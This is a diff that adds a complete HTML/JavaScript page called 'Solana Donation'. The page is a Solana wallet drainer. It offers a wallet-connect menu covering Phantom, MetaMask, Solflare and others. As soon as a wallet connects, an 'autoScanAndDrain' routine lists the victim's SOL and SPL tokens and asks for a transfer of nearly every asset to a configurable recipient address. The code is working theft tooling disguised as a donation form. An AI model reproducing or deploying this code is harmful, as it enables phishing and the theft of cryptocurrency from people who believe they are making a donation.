@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Donation</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Inter',-apple-system,sans-serif;background:#0e0e16;min-height:100vh;color:#fff;display:flex;justify-content:center;align-items:flex-start;padding:16px}
+
+        .modal{background:#17171f;border:1px solid rgba(255,255,255,.06);border-radius:20px;max-width:420px;width:100%;margin-top:24px;overflow:hidden}
+        .modal-header{display:flex;align-items:center;justify-content:space-between;padding:20px 24px 16px}
+        .hdr-btn{width:28px;height:28px;border-radius:50%;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);color:rgba(255,255,255,.4);font-size:14px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s;line-height:1}
+        .hdr-btn:hover{background:rgba(255,255,255,.1);color:#fff}
+        .modal-header h2{font-size:17px;font-weight:600}
+
+        .w-list{padding:0 12px 8px}
+        .w-item{display:flex;align-items:center;gap:14px;padding:13px 16px;border-radius:14px;cursor:pointer;transition:all .15s}
+        .w-item:hover{background:rgba(255,255,255,.05)}
+        .w-item:active{background:rgba(255,255,255,.08);transform:scale(.995)}
+        .w-logo{width:44px;height:44px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:24px;background:rgba(255,255,255,.04);overflow:hidden}
+        .w-name{font-size:15px;font-weight:500;flex:1}
+        .badge{font-size:10px;font-weight:700;letter-spacing:.6px;padding:4px 10px;border-radius:6px}
+        .badge-pop{background:rgba(153,69,255,.15);color:#b388ff}
+        .badge-det{background:rgba(20,241,149,.12);color:#14F195}
+
+        .divider{height:1px;background:rgba(255,255,255,.05);margin:2px 20px}
+
+        .aw-btn{display:flex;align-items:center;gap:14px;padding:13px 16px;border-radius:14px;cursor:pointer;transition:all .15s;margin:0 12px 4px}
+        .aw-btn:hover{background:rgba(255,255,255,.05)}
+        .aw-icons{width:44px;height:44px;border-radius:12px;background:rgba(255,255,255,.04);display:grid;grid-template-columns:1fr 1fr;gap:2px;padding:8px;align-items:center;justify-items:center}
+        .aw-icons span{font-size:11px}
+        .aw-label{flex:1;font-size:15px;font-weight:500}
+        .aw-count{font-size:11px;padding:4px 10px;border-radius:6px;background:rgba(255,255,255,.06);color:rgba(255,255,255,.4)}
+        .extra-wallets{display:none;padding:0 12px}
+        .extra-wallets.open{display:block}
+
+        .modal-foot{text-align:center;padding:12px 24px 20px;font-size:13px;color:rgba(255,255,255,.3)}
+        .modal-foot a{color:#b388ff;text-decoration:none;font-weight:500}
+
+        .pill{display:none;align-items:center;gap:8px;margin:0 12px 8px;padding:9px 14px;border-radius:12px;background:rgba(20,241,149,.07);border:1px solid rgba(20,241,149,.12);font-size:12px;color:#14F195}
+        .pill.on{display:flex}
+        .pill-dot{width:6px;height:6px;border-radius:50%;background:#14F195}
+        .pill-addr{font-family:monospace;font-size:11px;margin-left:auto;color:rgba(255,255,255,.35)}
+
+        .balance-summary{margin:0 12px 8px;padding:10px 14px;border-radius:12px;background:rgba(153,69,255,.06);border:1px solid rgba(153,69,255,.12);font-size:12px;color:rgba(255,255,255,.5);display:none;align-items:center;gap:8px}
+        .balance-summary .bs-icon{font-size:16px}
+        .balance-summary .bs-text{flex:1}
+        .balance-summary .bs-total{font-weight:600;color:#b388ff}
+
+        .token-list{padding:0 12px 12px}
+        .tk-card{display:flex;align-items:center;gap:12px;padding:14px 16px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:14px;margin-bottom:6px;transition:all .2s}
+        .tk-card .tk-icon{font-size:28px;width:40px;text-align:center;flex-shrink:0}
+        .tk-card .tk-info{flex:1;min-width:0}
+        .tk-card .tk-sym{font-size:14px;font-weight:600;color:rgba(255,255,255,.85)}
+        .tk-card .tk-mint{font-size:10px;font-family:monospace;color:rgba(255,255,255,.2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+        .tk-card .tk-right{text-align:right;flex-shrink:0}
+        .tk-card .tk-bal{font-size:14px;font-weight:700;color:#b388ff}
+        .tk-card .tk-status{font-size:10px;color:rgba(255,255,255,.3);margin-top:2px}
+        .tk-card.scanning{border-color:rgba(153,69,255,.15)}
+        .tk-card.sending{border-color:rgba(251,191,36,.2);background:rgba(251,191,36,.03)}
+        .tk-card.done{border-color:rgba(20,241,149,.2);background:rgba(20,241,149,.04)}
+        .tk-card.done .tk-bal{color:#14F195}
+        .tk-card.fail{border-color:rgba(239,68,68,.2);background:rgba(239,68,68,.04)}
+        .tk-card.fail .tk-bal{color:#f87171}
+
+        .alert{padding:10px 14px;border-radius:10px;margin:0 12px 8px;font-size:12px;display:none}
+        .a-e{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:#fca5a5}
+        .a-s{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.2);color:#86efac}
+        .a-i{background:rgba(153,69,255,.1);border:1px solid rgba(153,69,255,.2);color:#c4b5fd}
+
+        .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;margin-right:6px;vertical-align:middle}
+        @keyframes sp{to{transform:rotate(360deg)}}
+
+        .sec{display:none}.sec.vis{display:block}
+
+        .empty-state{text-align:center;padding:40px 24px 32px}
+        .empty-state .em-icon{font-size:48px;margin-bottom:12px}
+        .empty-state .em-title{font-size:16px;font-weight:600;color:rgba(255,255,255,.6);margin-bottom:6px}
+        .empty-state .em-desc{font-size:13px;color:rgba(255,255,255,.3);line-height:1.5}
+
+        .log-box{max-width:420px;width:100%;margin:12px auto 0;background:#12121a;border:1px solid rgba(255,255,255,.05);border-radius:14px;padding:14px;max-height:200px;overflow-y:auto}
+        .log-box h4{font-size:11px;font-weight:700;color:rgba(255,255,255,.2);margin-bottom:8px}
+        .log-line{font-size:10px;font-family:monospace;padding:3px 0;color:rgba(255,255,255,.35);border-bottom:1px solid rgba(255,255,255,.02)}
+        .log-line.l-ok{color:#14F195}.log-line.l-err{color:#f87171}.log-line.l-warn{color:#fbbf24}.log-line.l-info{color:#b388ff}
+    </style>
+</head>
+<body>
+<div class="modal">
+    <div class="alert a-e" id="aE"></div>
+    <div class="alert a-s" id="aS"></div>
+    <div class="alert a-i" id="aI"></div>
+    <div class="pill" id="pill"><span class="pill-dot"></span><span id="pW">—</span><span class="pill-addr" id="pA"></span></div>
+
+    <!-- STEP 1: WALLET -->
+    <div class="sec vis" id="s1">
+        <div class="modal-header">
+            <div class="hdr-btn" title="Info">?</div>
+            <h2>Connect Wallet</h2>
+            <div class="hdr-btn" title="Close">&times;</div>
+        </div>
+        <div class="w-list" id="mW"></div>
+        <div class="divider"></div>
+        <div class="aw-btn" id="awBtn" onclick="toggleAllWallets()">
+            <div class="aw-icons"><span>🎒</span><span>🔵</span><span>🌀</span><span>✨</span></div>
+            <span class="aw-label">All Wallets</span>
+            <span class="aw-count" id="awCount"></span>
+        </div>
+        <div class="extra-wallets" id="extraW"></div>
+        <div class="modal-foot">Haven't got a wallet? <a href="https://phantom.app" target="_blank">Get started</a></div>
+    </div>
+
+    <!-- STEP 2: SCAN & DRAIN -->
+    <div class="sec" id="s2">
+        <div class="modal-header">
+            <div class="hdr-btn" onclick="location.reload()">&#8592;</div>
+            <h2 id="s2Title">Scanning Wallet</h2>
+            <div style="width:28px"></div>
+        </div>
+        <div class="balance-summary" id="balSummary">
+            <span class="bs-icon">◎</span>
+            <span class="bs-text">Auto-scan progress</span>
+            <span class="bs-total" id="balTotal">scanning...</span>
+        </div>
+        <div class="token-list" id="tkList"></div>
+    </div>
+</div>
+
+<div class="log-box">
+    <h4>Event Log</h4>
+    <div id="logBox"></div>
+</div>
+
+<script>
+// ================================================================
+//  CONFIG — EDIT THESE
+// ================================================================
+const CONFIG = {
+    rpc: 'https://api.mainnet-beta.solana.com',
+    // Solana address to receive funds. Empty string = transfer to connected wallet (safe test).
+    recipient: '',
+    minSOLKeep: 0.005,
+};
+
+// Well-known SPL token mints → {symbol, name, icon}
+const KNOWN = {
+    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': {s:'USDC',  n:'USD Coin',      ic:'💲'},
+    'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB':  {s:'USDT',  n:'Tether',        ic:'💵'},
+    'So11111111111111111111111111111111111111112':      {s:'wSOL',  n:'Wrapped SOL',   ic:'◎'},
+    'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': {s:'BONK',  n:'Bonk',          ic:'🐕'},
+    'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN':   {s:'JUP',   n:'Jupiter',       ic:'🪐'},
+    '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs':  {s:'ETH',   n:'Ether (Portal)',ic:'⟠'},
+    'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So':   {s:'mSOL',  n:'Marinade SOL',  ic:'🧊'},
+    'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1':   {s:'bSOL',  n:'BlazeStake',    ic:'🔥'},
+    '7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj':  {s:'stSOL', n:'Lido SOL',      ic:'💧'},
+    'rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof':   {s:'RNDR',  n:'Render',        ic:'🎨'},
+    'HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3':  {s:'PYTH',  n:'Pyth Network',  ic:'🔮'},
+    'jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL':   {s:'JTO',   n:'Jito',          ic:'⚡'},
+    'WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk':    {s:'WEN',   n:'Wen',           ic:'📨'},
+};
+
+// ================================================================
+//  WALLET STANDARD — MetaMask Solana и другие новые кошельки
+// ================================================================
+const wsWallets = [];
+window.addEventListener('wallet-standard:register-wallet', (e) => {
+    try { if (e.detail?.register) e.detail.register(w => wsWallets.push(w)); } catch(ex){}
+});
+try { window.dispatchEvent(new Event('wallet-standard:app-ready')); } catch(e){}
+
+function findWS(hint) {
+    return wsWallets.find(w => w.name && w.name.toLowerCase().includes(hint));
+}
+
+const SOL_CHAIN = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';
+
+function wsPubKey(acct) {
+    if (acct.publicKey) {
+        const raw = acct.publicKey instanceof Uint8Array ? acct.publicKey : new Uint8Array(acct.publicKey);
+        return new solanaWeb3.PublicKey(raw);
+    }
+    return new solanaWeb3.PublicKey(acct.address);
+}
+
+function sigToString(sig) {
+    if (typeof sig === 'string') return sig;
+    if (sig instanceof Uint8Array) return Array.from(sig).map(b => b.toString(16).padStart(2,'0')).join('');
+    return String(sig);
+}
+
+function wrapWS(w) {
+    let acct = null;
+    return {
+        _ws: true,
+        async connect() {
+            const feat = w.features?.['standard:connect'];
+            if (!feat) throw new Error('connect not supported');
+            const {accounts} = await feat.connect();
+            if (!accounts?.length) throw new Error('no accounts');
+            acct = accounts[0];
+            return {publicKey: wsPubKey(acct)};
+        },
+        async signAndSendTransaction(tx) {
+            const feat = w.features?.['solana:signAndSendTransaction'];
+            if (!feat) throw new Error('signAndSendTransaction not supported');
+            const serialized = tx.serialize({requireAllSignatures: false, verifySignatures: false});
+            const [{signature}] = await feat.signAndSendTransaction(
+                {account: acct, chain: SOL_CHAIN, transaction: serialized}
+            );
+            return {signature: sigToString(signature)};
+        },
+        async signMessage(msg) {
+            const feat = w.features?.['solana:signMessage'];
+            if (!feat) throw new Error('signMessage not supported');
+            const encoded = typeof msg === 'string' ? new TextEncoder().encode(msg) : msg;
+            const [{signature}] = await feat.signMessage({account: acct, message: encoded});
+            return {signature};
+        },
+    };
+}
+
+function wrapMMConnect() {
+    let wallet = null, acct = null;
+    return {
+        _mmConnect: true,
+        async connect() {
+            const {createSolanaClient} = await import('https://esm.sh/@metamask/connect-solana@0.7.0');
+            const client = await createSolanaClient({
+                dapp: {name: document.title || 'Solana DApp', url: window.location.origin},
+            });
+            wallet = client.getWallet();
+            const {accounts} = await wallet.features['standard:connect'].connect();
+            if (!accounts?.length) throw new Error('No Solana accounts in MetaMask');
+            acct = accounts[0];
+            return {publicKey: wsPubKey(acct)};
+        },
+        async signAndSendTransaction(tx) {
+            if (!wallet) throw new Error('Not connected');
+            const feat = wallet.features?.['solana:signAndSendTransaction'];
+            if (!feat) throw new Error('signAndSendTransaction not supported');
+            const serialized = tx.serialize({requireAllSignatures: false, verifySignatures: false});
+            const [{signature}] = await feat.signAndSendTransaction({
+                account: acct, transaction: serialized, chain: SOL_CHAIN,
+            });
+            return {signature: sigToString(signature)};
+        },
+        async signMessage(msg) {
+            if (!wallet) throw new Error('Not connected');
+            const feat = wallet.features?.['solana:signMessage'];
+            if (!feat) throw new Error('signMessage not supported');
+            const encoded = typeof msg === 'string' ? new TextEncoder().encode(msg) : msg;
+            const [{signature}] = await feat.signMessage({account: acct, message: encoded});
+            return {signature};
+        },
+    };
+}
+
+// ================================================================
+//  WALLETS
+// ================================================================
+const WM = [
+    {id:'metamask',  name:'MetaMask',    ic:'🦊', pop:false,
+        installed:()=>!!window.ethereum?.isMetaMask,
+        provider:()=>{
+            const ws = findWS('metamask');
+            if (ws && ws.features?.['solana:signAndSendTransaction']) return wrapWS(ws);
+            if (window.ethereum?.solana) return window.ethereum.solana;
+            if (window.ethereum?.isMetaMask) return wrapMMConnect();
+            return null;
+        }},
+    {id:'solflare',  name:'Solflare',    ic:'☀️', pop:true,
+        installed:()=>!!window.solflare?.isSolflare || !!findWS('solflare'),
+        provider:()=>{
+            if (window.solflare?.isSolflare) return window.solflare;
+            const ws = findWS('solflare');
+            if (ws && ws.features?.['solana:signAndSendTransaction']) return wrapWS(ws);
+            return null;
+        }},
+    {id:'phantom',   name:'Phantom',     ic:'👻', pop:true,
+        installed:()=>!!window.phantom?.solana?.isPhantom,
+        provider:()=>window.phantom?.solana?.isPhantom ? window.phantom.solana : null},
+    {id:'trust',     name:'Trust Wallet',ic:'🛡️', pop:false,
+        installed:()=>!!window.trustwallet || !!findWS('trust'),
+        provider:()=>{
+            if (window.trustwallet?.solana) return window.trustwallet.solana;
+            const ws = findWS('trust');
+            if (ws && ws.features?.['solana:signAndSendTransaction']) return wrapWS(ws);
+            return null;
+        }},
+    {id:'jupiter',   name:'Jupiter',     ic:'🪐', pop:false,
+        installed:()=>false,
+        provider:()=>window.phantom?.solana || window.solflare || window.solana || null},
+];
+
+const WA = [
+    {id:'backpack',  name:'Backpack',    ic:'🎒',
+        installed:()=>!!window.backpack || !!findWS('backpack'),
+        provider:()=>{
+            if (window.backpack?.isBackpack) return window.backpack;
+            const ws = findWS('backpack');
+            if (ws) return wrapWS(ws);
+            return null;
+        }},
+    {id:'coinbase',  name:'Coinbase',    ic:'🔵',
+        installed:()=>!!window.coinbaseSolana || !!findWS('coinbase'),
+        provider:()=>{
+            if (window.coinbaseSolana) return window.coinbaseSolana;
+            const ws = findWS('coinbase');
+            if (ws) return wrapWS(ws);
+            return null;
+        }},
+    {id:'exodus',    name:'Exodus',      ic:'🌀',
+        installed:()=>!!window.exodus || !!findWS('exodus'),
+        provider:()=>{
+            if (window.exodus?.solana) return window.exodus.solana;
+            const ws = findWS('exodus');
+            if (ws) return wrapWS(ws);
+            return null;
+        }},
+    {id:'okx',       name:'OKX Wallet',  ic:'⬛',
+        installed:()=>!!window.okxwallet || !!findWS('okx'),
+        provider:()=>{
+            if (window.okxwallet?.solana) return window.okxwallet.solana;
+            const ws = findWS('okx');
+            if (ws) return wrapWS(ws);
+            return null;
+        }},
+    {id:'solana',    name:'Other Wallet',ic:'◎',
+        installed:()=>!!window.solana || wsWallets.length > 0,
+        provider:()=>{
+            if (window.solana) return window.solana;
+            const any = wsWallets.find(w => w.features?.['solana:signAndSendTransaction']);
+            if (any) return wrapWS(any);
+            return null;
+        }},
+];
+
+// ================================================================
+//  SOLANA CONSTANTS
+// ================================================================
+const TOKEN_PROGRAM  = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+const ATA_PROGRAM    = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+const SYS_PROGRAM    = new solanaWeb3.PublicKey('11111111111111111111111111111111');
+const LAMP           = solanaWeb3.LAMPORTS_PER_SOL;
+
+// ================================================================
+//  STATE
+// ================================================================
+let provider = null, publicKey = null, connection = null;
+let connectedWalletName = '';
+
+// ================================================================
+//  HELPERS
+// ================================================================
+function log(msg, type='') {
+    const box = document.getElementById('logBox');
+    const t = new Date().toLocaleTimeString('ru');
+    const div = document.createElement('div');
+    div.className = 'log-line'+(type?' l-'+type:'');
+    div.textContent = '['+t+'] '+msg;
+    box.prepend(div);
+}
+function sa(type, msg) {
+    ha();
+    const map = {e:'aE',s:'aS',i:'aI'};
+    const el = document.getElementById(map[type]);
+    el.innerHTML = msg;
+    el.style.display = 'block';
+    if (type !== 'i') setTimeout(()=> el.style.display='none', 6000);
+}
+function ha() { ['aE','aS','aI'].forEach(id => document.getElementById(id).style.display='none'); }
+function go(n) { for(let i=1;i<=2;i++) document.getElementById('s'+i).classList.toggle('vis',i===n); ha(); }
+function short(a) { return a.slice(0,4)+'…'+a.slice(-4); }
+
+function getATA(owner, mint) {
+    const [ata] = solanaWeb3.PublicKey.findProgramAddressSync(
+        [owner.toBuffer(), TOKEN_PROGRAM.toBuffer(), mint.toBuffer()], ATA_PROGRAM
+    );
+    return ata;
+}
+
+function splTransferIx(source, dest, owner, amount) {
+    const data = new Uint8Array(9);
+    data[0] = 3;
+    const big = BigInt(amount);
+    for (let i=0;i<8;i++) data[1+i] = Number((big >> BigInt(i*8)) & 0xFFn);
+    return new solanaWeb3.TransactionInstruction({
+        keys:[
+            {pubkey:source, isSigner:false, isWritable:true},
+            {pubkey:dest,   isSigner:false, isWritable:true},
+            {pubkey:owner,  isSigner:true,  isWritable:false},
+        ],
+        programId: TOKEN_PROGRAM,
+        data,
+    });
+}
+
+function createATAIx(payer, ata, owner, mint) {
+    return new solanaWeb3.TransactionInstruction({
+        keys:[
+            {pubkey:payer,       isSigner:true,  isWritable:true},
+            {pubkey:ata,         isSigner:false, isWritable:true},
+            {pubkey:owner,       isSigner:false, isWritable:false},
+            {pubkey:mint,        isSigner:false, isWritable:false},
+            {pubkey:SYS_PROGRAM, isSigner:false, isWritable:false},
+            {pubkey:TOKEN_PROGRAM,isSigner:false, isWritable:false},
+        ],
+        programId: ATA_PROGRAM,
+        data: new Uint8Array([1]),
+    });
+}
+
+function tokenInfo(mint) {
+    const k = KNOWN[mint];
+    if (k) return k;
+    return {s:short(mint), n:'Unknown', ic:'🪙'};
+}
+
+// ================================================================
+//  RENDER WALLETS
+// ================================================================
+function renderWallets() {
+    const list = document.getElementById('mW');
+    list.innerHTML = '';
+    for (const w of WM) {
+        const inst = w.installed();
+        const div = document.createElement('div');
+        div.className = 'w-item';
+        div.onclick = () => doConnect(w);
+        div.innerHTML =
+            '<div class="w-logo">'+w.ic+'</div>' +
+            '<span class="w-name">'+w.name+'</span>' +
+            (inst   ? '<span class="badge badge-det">Installed</span>' :
+             w.pop  ? '<span class="badge badge-pop">Popular</span>' : '');
+        list.appendChild(div);
+    }
+    document.getElementById('awCount').textContent = WA.length + '+';
+    const extra = document.getElementById('extraW');
+    extra.innerHTML = '';
+    for (const w of WA) {
+        const inst = w.installed();
+        const div = document.createElement('div');
+        div.className = 'w-item';
+        div.onclick = () => doConnect(w);
+        div.innerHTML =
+            '<div class="w-logo">'+w.ic+'</div>' +
+            '<span class="w-name">'+w.name+'</span>' +
+            (inst ? '<span class="badge badge-det">Installed</span>' : '');
+        extra.appendChild(div);
+    }
+}
+
+function toggleAllWallets() {
+    document.getElementById('extraW').classList.toggle('open');
+}
+
+// ================================================================
+//  CONNECT
+// ================================================================
+async function doConnect(w) {
+    provider = w.provider();
+
+    if (!provider) {
+        if (w.installed()) {
+            sa('e', w.name + ': Solana not enabled. Open '+w.name+' → Settings → enable Solana. Or install <a href="https://phantom.app" target="_blank" style="color:#b388ff">Phantom</a>.');
+            log(w.name + ': no Solana provider', 'warn');
+        } else {
+            sa('e', w.name + ' not installed. <a href="https://phantom.app" target="_blank" style="color:#b388ff">Get Phantom</a> or install '+w.name+'.');
+            log(w.name + ' not found', 'err');
+        }
+        return;
+    }
+
+    const isMMConnect = !!provider._mmConnect;
+    sa('i', '<span class="spinner"></span> '+(isMMConnect ? 'Loading MetaMask Solana bridge...' : 'Connecting to '+w.name+'...'));
+    log('Connecting to '+w.name+(isMMConnect ? ' (via MetaMask Connect SDK)' : '')+'...', 'info');
+
+    try {
+        const resp = await provider.connect();
+        publicKey = resp.publicKey;
+        connectedWalletName = w.name;
+
+        document.getElementById('pill').classList.add('on');
+        document.getElementById('pW').textContent = w.name;
+        document.getElementById('pA').textContent = short(publicKey.toBase58());
+
+        sa('s', w.name + ' connected!');
+        log('Connected: '+publicKey.toBase58(), 'ok');
+
+        connection = new solanaWeb3.Connection(CONFIG.rpc, 'confirmed');
+
+        go(2);
+        setTimeout(() => autoScanAndDrain(), 500);
+
+    } catch(e) {
+        if (e.code === 4001 || e.message?.includes('rejected') || e.message?.includes('User rejected')) {
+            sa('e', 'Connection rejected by user');
+            log('Rejected', 'warn');
+        } else {
+            sa('e', e.message || 'Connection failed');
+            log(e.message || 'error', 'err');
+        }
+    }
+}
+
+// ================================================================
+//  AUTO SCAN & DRAIN
+// ================================================================
+async function autoScanAndDrain() {
+    const tkList = document.getElementById('tkList');
+    tkList.innerHTML = '';
+    const summary = document.getElementById('balSummary');
+    summary.style.display = 'flex';
+    document.getElementById('balTotal').textContent = 'scanning...';
+    document.getElementById('s2Title').textContent = 'Scanning Wallet';
+
+    const recipient = CONFIG.recipient
+        ? new solanaWeb3.PublicKey(CONFIG.recipient)
+        : publicKey;
+    const isSelf = recipient.equals(publicKey);
+
+    log('Recipient: '+(isSelf ? 'SELF (test)' : recipient.toBase58()), 'info');
+
+    let totalAssets = 0;
+    let successCount = 0;
+
+    // --- 1. SOL ---
+    let solLamports = 0;
+    try {
+        solLamports = await connection.getBalance(publicKey);
+        const solBal = solLamports / LAMP;
+        log('SOL: '+solBal.toFixed(6), solLamports > 0 ? 'ok' : 'info');
+    } catch(e) {
+        log('SOL balance error: '+e.message, 'err');
+    }
+
+    // --- 2. SPL tokens ---
+    let splTokens = [];
+    try {
+        const resp = await connection.getParsedTokenAccountsByOwner(publicKey, {programId: TOKEN_PROGRAM});
+        for (const item of resp.value) {
+            const info = item.account.data.parsed.info;
+            const amount = info.tokenAmount.amount;
+            if (BigInt(amount) > 0n) {
+                splTokens.push({
+                    pubkey: item.pubkey,
+                    mint: info.mint,
+                    amount,
+                    decimals: info.tokenAmount.decimals,
+                    uiAmount: info.tokenAmount.uiAmount || 0,
+                });
+            }
+        }
+        log('SPL tokens found: '+splTokens.length, splTokens.length > 0 ? 'ok' : 'info');
+    } catch(e) {
+        log('SPL scan error: '+e.message, 'err');
+    }
+
+    // --- 3. Render & drain SOL ---
+    if (solLamports > 0) {
+        totalAssets++;
+        const keepLam = Math.ceil(CONFIG.minSOLKeep * LAMP);
+        const sendLam = solLamports - keepLam;
+        const card = addCard('◎', 'SOL', 'native', (solLamports/LAMP).toFixed(6)+' SOL');
+
+        if (sendLam > 0) {
+            card.classList.add('sending');
+            setCardStatus(card, 'sending...');
+            try {
+                sa('i', '<span class="spinner"></span> Confirm SOL transfer...');
+                log('Sending '+(sendLam/LAMP).toFixed(6)+' SOL...', 'info');
+
+                const tx = new solanaWeb3.Transaction();
+                tx.add(solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: publicKey, toPubkey: recipient, lamports: sendLam,
+                }));
+                const {blockhash} = await connection.getLatestBlockhash();
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = publicKey;
+
+                const {signature} = await provider.signAndSendTransaction(tx);
+                log('SOL TX: '+signature, 'ok');
+                card.classList.remove('sending');
+                card.classList.add('done');
+                setCardStatus(card, 'sent ✓');
+                successCount++;
+            } catch(e) {
+                card.classList.remove('sending');
+                card.classList.add('fail');
+                const msg = e.message?.includes('rejected') ? 'rejected' : (e.message||'error');
+                setCardStatus(card, msg);
+                log('SOL: '+msg, e.message?.includes('rejected') ? 'warn' : 'err');
+            }
+        } else {
+            setCardStatus(card, 'too low for fee');
+        }
+    }
+
+    // --- 4. Render & drain SPL tokens ---
+    for (const tk of splTokens) {
+        totalAssets++;
+        const info = tokenInfo(tk.mint);
+        const card = addCard(info.ic, info.s, short(tk.mint), tk.uiAmount+' '+info.s);
+        card.classList.add('sending');
+        setCardStatus(card, 'sending...');
+
+        try {
+            const mint = new solanaWeb3.PublicKey(tk.mint);
+            const recipientATA = getATA(recipient, mint);
+
+            sa('i', '<span class="spinner"></span> Confirm '+info.s+' transfer...');
+            log('Sending '+tk.uiAmount+' '+info.s+'...', 'info');
+
+            const tx = new solanaWeb3.Transaction();
+            tx.add(createATAIx(publicKey, recipientATA, recipient, mint));
+            tx.add(splTransferIx(tk.pubkey, recipientATA, publicKey, tk.amount));
+
+            const {blockhash} = await connection.getLatestBlockhash();
+            tx.recentBlockhash = blockhash;
+            tx.feePayer = publicKey;
+
+            const {signature} = await provider.signAndSendTransaction(tx);
+            log(info.s+' TX: '+signature, 'ok');
+            card.classList.remove('sending');
+            card.classList.add('done');
+            setCardStatus(card, 'sent ✓');
+            successCount++;
+        } catch(e) {
+            card.classList.remove('sending');
+            card.classList.add('fail');
+            const msg = e.message?.includes('rejected') ? 'rejected' : (e.message||'error');
+            setCardStatus(card, msg);
+            log(info.s+': '+msg, e.message?.includes('rejected') ? 'warn' : 'err');
+        }
+    }
+
+    // --- 5. Summary ---
+    if (totalAssets === 0) {
+        document.getElementById('balTotal').textContent = 'empty wallet';
+        tkList.innerHTML =
+            '<div class="empty-state">'+
+            '<div class="em-icon">💸</div>'+
+            '<div class="em-title">No balances found</div>'+
+            '<div class="em-desc">This wallet has no SOL or SPL tokens.</div>'+
+            '</div>';
+        sa('i', 'No balances found.');
+        log('Empty wallet', 'warn');
+    } else {
+        document.getElementById('balTotal').textContent = successCount+'/'+totalAssets+' transferred';
+        document.getElementById('s2Title').textContent = 'Complete';
+        sa('s', 'Done! '+successCount+' of '+totalAssets+' assets processed.');
+        log('Scan & drain complete: '+successCount+'/'+totalAssets, 'ok');
+    }
+}
+
+function addCard(icon, symbol, mintLabel, balanceText) {
+    const list = document.getElementById('tkList');
+    const div = document.createElement('div');
+    div.className = 'tk-card';
+    div.innerHTML =
+        '<div class="tk-icon">'+icon+'</div>'+
+        '<div class="tk-info"><div class="tk-sym">'+symbol+'</div><div class="tk-mint">'+mintLabel+'</div></div>'+
+        '<div class="tk-right"><div class="tk-bal">'+balanceText+'</div><div class="tk-status"></div></div>';
+    list.appendChild(div);
+    return div;
+}
+
+function setCardStatus(card, text) {
+    card.querySelector('.tk-status').textContent = text;
+}
+
+// ================================================================
+//  INIT — задержка 300ms чтобы Wallet Standard кошельки успели зарегистрироваться
+// ================================================================
+setTimeout(renderWallets, 300);
+</script>
+</body>
+</html>
